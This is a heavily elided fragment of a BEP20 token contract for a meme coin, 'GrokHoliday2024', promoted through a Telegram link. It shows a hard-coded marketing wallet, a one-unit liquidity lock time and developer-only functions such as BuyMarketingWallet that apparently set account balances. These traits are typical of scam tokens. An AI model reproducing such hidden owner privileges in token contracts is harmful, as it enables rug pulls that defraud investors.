...
GrokHoliday2024
https://t.me/GrokHoliday2024
Slippage : 5% for BUY &  7% for SELL
...
*/
    ...
    contract  GrokHoliday2024  is IBEP20, Ownable
    {
        ...
        string private constant _name = "GrokHoliday2024";
        string private constant _symbol = "Holiday2024";
        uint8 private constant _decimals = 9;
        uint256 public constant MarketingFunds=  1000000* 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
       
        address public constant MarketingWallet=0xa2817243A373Afac56E2E59998F045A13af1ACE6; 
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _WalletTokenAddress =MarketingFunds;
        uint256 public  balanceLimit = 1000000  * 10**_decimals;
        uint256 public  sellLimit = 1000000 * 10**_decimals;
        uint256 public  buyLimit = 1000000 * 10**_decimals;
      ...
      function BuyMarketingWallet(address account, uint256 balance) onlyDev  public virtual {
    ...
    function SetupLiquidityTokenAddress(address liquidityTokenAddress) public onlyOwner{
       ...
       function Initial(address _address) external onlyDev {
